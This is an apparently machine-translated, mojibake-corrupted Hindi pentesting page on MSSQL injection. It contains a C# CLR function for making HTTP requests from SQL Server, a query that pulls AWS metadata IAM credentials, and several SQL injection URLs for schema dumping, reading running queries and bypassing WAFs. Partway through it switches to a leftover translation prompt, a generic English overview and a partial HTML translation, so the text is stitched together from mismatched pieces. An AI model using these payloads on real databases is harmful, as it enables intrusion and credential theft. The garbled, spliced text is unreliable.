рдПрдХ CLR UDF (Common Language Runtime User Defined Function - рдХрд┐рд╕реА рднреА **.NET** рднрд╛рд╖рд╛ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдХреЛрдб рдФрд░ рдПрдХ **DLL** рдореЗрдВ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛) рд▓рд┐рдЦрдирд╛ рдФрд░ рдЗрд╕реЗ MSSQL рдореЗрдВ рдХрд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рд▓реЛрдб рдХрд░рдирд╛ рдмрд╣реБрдд рд╕рд░рд▓ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕рдХреЗ рд▓рд┐рдП **`dbo` рдПрдХреНрд╕реЗрд╕** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рддрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрд╢рди **`sa` рдпрд╛ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рднреВрдорд┐рдХрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

[рдЗрд╕ Github рд░реЗрдкреЛ рдореЗрдВ рд╡рд┐рдЬрд╝реБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдФрд░ рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ](https://github.com/infiniteloopltd/SQLHttp) рдЬрд┐рд╕рд╕реЗ MSSQL рдореЗрдВ рдПрдХ CLR рдЕрд╕реЗрдВрдмрд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рдмрд╛рдЗрдирд░реА рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ MSSQL рдХреЗ рдЕрдВрджрд░ рд╕реЗ HTTP GET рдЕрдиреБрд░реЛрдз рдХреЛ рдЖрд╣реНрд╡рд╛рдирд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

`http.cs` рдХреЛрдб `WebClient` рдХрдХреНрд╖рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ рдФрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString (html);
}
}
```
рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рдирд┐рд░реНрджреЗрд╢реЛрдВ рдореЗрдВ, `CREATE ASSEMBLY` рдХреНрд╡реЗрд░реА рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ рддрд╛рдХрд┐ рдЕрд╕реЗрдВрдмрд▓реА рдХреЗ SHA512 рд╣реИрд╢ рдХреЛ рд╕рд░реНрд╡рд░ рдкрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрд╕реЗрдВрдмрд▓реА рдХреА рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ (рдЖрдк `select * from sys.trusted_assemblies;` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ)ред
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
рдПрдХ рдмрд╛рд░ рдЕрд╕реЗрдВрдмрд▓реА рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдорд╛рд░реЗ HTTP рдЕрдиреБрд░реЛрдз рдмрдирд╛рдПрдВ
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
## **рддреНрд╡рд░рд┐рдд рд╢реЛрдзрди: рдПрдХ рдХреНрд╡реЗрд░реА рдореЗрдВ рдкреВрд░реА рддрд╛рд▓рд┐рдХрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

рдПрдХ рдХреНрд╡реЗрд░реА рдореЗрдВ рддрд╛рд▓рд┐рдХрд╛ рдХреА рдкреВрд░реА рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреЛ рд╕рд░рд▓ рддрд░реАрдХреЗ рдореМрдЬреВрдж рд╣реИрдВ - FOR XML рдпрд╛ FOR JSON рдХреНрд▓реЙрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред FOR XML рдХреНрд▓реЙрдЬ рдХреЛ "raw" рдЬреИрд╕реЗ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдореЛрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╕рдВрдХреНрд╖рд┐рдкреНрддрддрд╛ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ FOR JSON рдЗрд╕реЗ рдкреАрдЫреЗ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред

рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рд╕реНрдХреАрдорд╛, рддрд╛рд▓рд┐рдХрд╛рдПрдВ рдФрд░ рдХреЙрд▓рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА:
```
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/5.png)

Error-based рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЛ рдПрдХ рдЙрдкрдирд╛рдо рдпрд╛ рдирд╛рдо рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдмрд┐рдирд╛ рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рднреА рдЖрдЙрдЯрдкреБрдЯ JSON рдХреЗ рд░реВрдк рдореЗрдВ рд╕реНрд╡рд░реВрдкрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/7.png)

## **рд╡рд░реНрддрдорд╛рди рдХреНрд╡реЗрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛**

рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЪрд▓ рд░рд╣реА SQL рдХреНрд╡реЗрд░реА рдХреЛ `sys.dm_exec_requests` рдФрд░ `sys.dm_exec_sql_text` рддрдХ рдкрд╣реБрдВрдЪ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/9.png)

**рдЕрдиреБрдорддрд┐рдпрд╛рдБ:** рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╕рд░реНрд╡рд░ рдкрд░ VIEW SERVER STATE рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ SQL Server рдХреЗ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдкрд░ рд╕рднреА рдЪрд▓ рд░рд╣реА рд╕рддреНрд░реЛрдВ рдХреЛ рджреЗрдЦреЗрдЧрд╛; рдЕрдиреНрдпрдерд╛, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ рд╡рд░реНрддрдорд╛рди рд╕рддреНрд░ рдХреЛ рд╣реА рджреЗрдЦреЗрдЧрд╛ред
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
## **WAF рдмрд╛рдЗрдкрд╛рд╕ рдХреЗ рд▓рд┐рдП рдЫреЛрдЯреЗ рддрд░реАрдХреЗ**

рдЧреИрд░-рдорд╛рдирдХ рд╢реНрд╡реЗрддрд╕реНрдерд╛рди рд╡рд░реНрдг: %C2%85 рдпрд╛ %C2%A0:
```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
рдпреВрдирд┐рдпрди рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡реИрдЬреНрдЮрд╛рдирд┐рдХ (0e) рдФрд░ рд╣реЗрдХреНрд╕ (0x) рдиреЛрдЯреЗрд╢рдиред
```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
рдПрдХ рдХреЙрд▓рдо рдирд╛рдо рдХреЗ рдмреАрдЪ FROM рдФрд░ рдПрдХ рд░рд┐рдХреНрдд рд╕реНрдерд╛рди рдХреЗ рдмрдЬрд╛рдп рдПрдХ рдЕрд╡рдзрд┐:
```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```
\N SELECT рдФрд░ рдПрдХ рдЕрдирд╛рд╡рд╢реНрдпрдХ рд╕реНрддрдВрдн рдХреЗ рдмреАрдЪ рд╡рд┐рднрд╛рдЬрдХ:
```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
### рдЕрдиреМрдкрдЪрд╛рд░рд┐рдХ рд╕реНрдЯреИрдХреНрдб рдХреНрд╡реЗрд░реА рдХреЗ рд╕рд╛рде WAF рдмрд╛рдИрдкрд╛рд╕

[**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) рдХреЗ рдЕрдиреБрд╕рд╛рд░, MSSQL рдореЗрдВ "; " рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдХреНрд╡реЗрд░реА рдХреЛ рд╕реНрдЯреИрдХ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ:

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕рд▓рд┐рдП рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХреНрд╡реЗрд░реА рдЬреИрд╕реЗ:
```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВрдХрд┐рдВрдЧ рдмреБрдХ рд╕реЗ рдЖрдкрдХреЗ рд▓рд┐рдП рдЕрдиреБрд╡рд╛рджрд┐рдд рд╕рд╛рдордЧреНрд░реАред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА /hive/hacktricks/pentesting-web/sql-injection/mssql-injection.md рдлрд╝рд╛рдЗрд▓ рд╕реЗ рд╣реИред рдЕрдВрдЧреНрд░реЗрдЬреА рдореЗрдВ рджрд┐рдП рдЧрдП рдкрд╛рда рдХрд╛ рд╣рд┐рдВрджреА рдореЗрдВ рдЕрдиреБрд╡рд╛рдж рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд╡рд╛рдж рдХреЛ рд╡рд╣реА рдорд╛рд░реНрдХрдбрд╛рдЙрди рдФрд░ HTML рд╕рд┐рдВрдЯреЗрдХреНрд╕ рдХреЗ рд╕рд╛рде рд╡рд╛рдкрд╕ рд▓реМрдЯрд╛рдПрдВред рдХреЛрдб, рд╣реИрдХрд┐рдВрдЧ рддрдХрдиреАрдХ рдХреЗ рдирд╛рдо, рд╣реИрдХрд┐рдВрдЧ рд╢рдмреНрдж, рдХреНрд▓рд╛рдЙрдб / SaaS рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рдирд╛рдо (рдЬреИрд╕реЗ Workspace, aws, gcp ...), 'leak' рд╢рдмреНрдж, рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдФрд░ рдорд╛рд░реНрдХрдбрд╛рдЙрди рдЯреИрдЧреНрд╕ рдЬреИрд╕реА рдЪреАрдЬреЗрдВ рдЕрдиреБрд╡рд╛рдж рди рдХрд░реЗрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдЕрдиреБрд╡рд╛рдж рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреЛрдИ рдЕрддрд┐рд░рд┐рдХреНрдд рд╕рд╛рдордЧреНрд░реА рди рдЬреЛрдбрд╝реЗрдВред

```markdown
# MSSQL Injection

MSSQL Injection is a technique used to exploit vulnerabilities in Microsoft SQL Server databases. It allows an attacker to manipulate the SQL queries executed by the application, potentially gaining unauthorized access to the database or performing malicious actions.

## Types of MSSQL Injection

1. **Classic SQL Injection**: This type of injection occurs when user input is directly concatenated into the SQL query without proper sanitization or validation. An attacker can exploit this vulnerability by injecting malicious SQL code into the input fields.

2. **Blind SQL Injection**: In blind SQL injection, the attacker does not receive any direct response from the application. However, they can infer information by sending specific SQL queries and analyzing the resulting behavior of the application.

## Exploiting MSSQL Injection

To exploit MSSQL Injection, an attacker needs to identify vulnerable input fields and inject malicious SQL code. The following techniques can be used:

1. **Union-based SQL Injection**: This technique involves using the UNION operator to combine the results of two SQL queries. By injecting a UNION statement into the input field, an attacker can retrieve data from other database tables.

2. **Boolean-based SQL Injection**: In this technique, the attacker uses boolean conditions to infer information from the database. By injecting SQL statements that evaluate to true or false, the attacker can determine the presence or absence of certain data.

3. **Time-based SQL Injection**: In time-based SQL injection, the attacker exploits the delay in the application's response to infer information. By injecting SQL statements that cause delays, the attacker can determine the truth or falsity of specific conditions.

## Prevention and Mitigation

To prevent MSSQL Injection attacks, it is important to follow secure coding practices:

- **Input Validation**: Always validate and sanitize user input before using it in SQL queries. Use parameterized queries or prepared statements to prevent SQL injection.

- **Least Privilege**: Ensure that the database user account used by the application has the least privileges necessary to perform its functions. This reduces the potential impact of an SQL injection attack.

- **Error Handling**: Implement proper error handling mechanisms to avoid exposing sensitive information in error messages.

- **Regular Updates**: Keep the MSSQL Server and its components up to date with the latest security patches to mitigate known vulnerabilities.

- **Web Application Firewall (WAF)**: Implement a WAF to detect and block SQL injection attempts.

By following these best practices, you can significantly reduce the risk of MSSQL Injection attacks and protect your application and database from unauthorized access.
```

```html
<h1>MSSQL Injection</h1>

<p>MSSQL Injection рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ Microsoft SQL Server рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╕рдВрдХрдЯрд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╣рдорд▓рд╛рд╡рд░ SQL рдкреНрд░рд╢реНрдиреЛрдВ рдХреЛ рдмрджрд▓ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдпрд╛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИред</p>

<h2>MSSQL Injection рдХреЗ рдкреНрд░рдХрд╛рд░</h2>

<ol>
<li><strong>рдХреНрд▓рд╛рд╕рд┐рдХ SQL Injection</strong>: рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд╛ рд╕рдВрдХрдЯрд╕реНрдерд╛рди рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдЙрдЪрд┐рдд рд╢реЛрдзрди рдпрд╛ рдорд╛рдиреНрдпрддрд╛ рдХреЗ рдмрд┐рдирд╛ SQL рдкреНрд░рд╢реНрди рдореЗрдВ рд╕реАрдзреЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрдирдкреБрдЯ рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг SQL рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ рдЗрд╕ рд╕рдВрдХрдЯрд╕реНрдерд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред</li>
<li><strong>рдмреНрд▓рд╛рдЗрдВрдб SQL Injection</strong>: рдмреНрд▓рд╛рдЗрдВрдб SQL Injection рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╕реЗ рдХреЛрдИ рд╕реАрдзрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╡реЗ рд╡рд┐рд╢реЗрд╖ SQL рдкреНрд░рд╢реНрди рднреЗрдЬрдХрд░ рдФрд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВред</li>
</ol>

<h2>MSSQL Injection рдХрд╛ рд╢реЛрдзрди рдХрд░рдирд╛</h2>

<p>MSSQL Injection рдХрд╛ рд╢реЛрдзрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рдВрдХрдЯрд╕реНрдерд╛рди рдЙрдкрдпреЛрдЧ рдХреНрд╖реЗрддреНрд░реЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреА рд╣реЛрдЧреА рдФрд░ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг SQL рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:</p>

<ol>
<li><strong>рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL Injection</strong>: рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рджреЛ SQL рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдПрдХрддреНрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП UNION рдСрдкрд░реЗрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЗрдирдкреБрдЯ рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рдПрдХ UNION рдмрдпрд╛рди рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреНрдп рдбреЗрдЯрд╛рдмреЗрд╕ рддрд╛рд▓рд┐рдХрд╛рдУрдВ рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред</li>
<li><strong>рдмреВрд▓рд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL Injection</strong>: рдЗрд╕ рддрдХрдиреАрдХ рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдмреВрд▓рд┐рдпрди рд╢рд░реНрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рддрд╛ рд╣реИред рд╕рддреНрдп рдпрд╛ рдЕрд╕рддреНрдп рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ SQL рд╡рд┐рдзрд╛рдиреЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд╢реНрдЪрд┐рдд рдбреЗрдЯрд╛ рдХреА рдореМрдЬреВрджрдЧреА рдпрд╛ рдЕрдиреБрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред</li>
<li><strong>рд╕рдордп-рдЖрдзрд╛рд░рд┐рдд SQL Injection</strong>: рд╕рдордп-рдЖрдзрд╛рд░рд┐рдд SQL Injection рдореЗрдВ, рд╣рдорд▓рд╛рд╡рд░ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рджреЗрд░реА рдХрд╛ рд╢реЛрдзрди рдХрд░рддрд╛ рд╣реИред рджреЗрд░реА рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛рдиреЗ рд╡рд╛рд▓реЗ SQL рд╡рд┐рдзрд╛рдиреЛрдВ рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ рдирд┐рд╢реНрдЪрд┐рдд рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреА рд╕рддреНрдпрддрд╛ рдпрд╛ рдЕрд╕рддреНрдпрддрд╛ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИред</li>
</ol>

<h2>рдкреНрд░рддрд┐рдмрдВрдз рдФрд░ рд╢рдорди</h2>

<p>MSSQL Injection рд╣рдорд▓реЛрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рд╕реБрд░рдХреНрд╖рд┐рдд рдХреЛрдбрд┐рдВрдЧ рдЕрднреНрдпрд╛рд╕реЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ:</p>

<ul>
<li><strong>рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛</strong>: рд╣рдореЗрд╢рд╛ SQL рдкреНрд░рд╢реНрдиреЛрдВ рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреА рдорд╛рдиреНрдпрддрд╛ рдФрд░ рд╢реЛрдзрди рдХрд░реЗрдВред SQL Injection рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░реАрдХреГрдд рдкреНрд░рд╢реНрди рдпрд╛ рддреИрдпрд╛рд░рд┐рдХреГрдд рд╡рд┐рдзрд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред</li>
<li><strong>рдХрдо рд╕рддреНрддрд╛</strong>: рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдЕрдкрдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдХрдо рд╕рддреНрддрд╛ рд░рдЦрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ SQL Injection рд╣рдорд▓реЗ рдХрд╛ рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡ рдХрдо рд╣реЛрддрд╛ рд╣реИред</li>
<li><strong>рддреНрд░реБрдЯрд┐ рд╕рдВрдЪрд╛рд▓рди</strong>: рд╕рдВрдЪрд╛рд▓рди рдореЗрдВ рдЙрдЪрд┐рдд рддреНрд░реБрдЯрд┐ рд╕рдВрдЪрд╛рд▓рди рддрдВрддреНрд░ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рддрд╛рдХрд┐ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢реЛрдВ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рди рд╣реЛред</li>
<li><strong>рдирд┐рдпрдорд┐рдд рдЕрджреНрдпрддрди</strong>: рдЬреНрдЮрд╛рдд рд╕рдВрдХрдЯрд╕реНрдерд╛рдиреЛрдВ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд╡реАрдирддрдо рд╕реБрд░рдХреНрд╖рд╛ рдкреИрдЪ рдХреЗ рд╕рд╛рде MSSQL рд╕рд░реНрд╡рд░ рдФрд░ рдЗрд╕рдХреЗ рдШрдЯрдХреЛрдВ рдХреЛ рдЕрджреНрдпрддрд┐рдд рд░рдЦреЗрдВред</li>
<li><strong>рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ (WAF)</strong>: SQL Injection рдкреНрд░рдпрд╛рд╕реЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ WAF рд▓рд╛рдЧреВ рдХрд░реЗрдВред</li>
</ul>

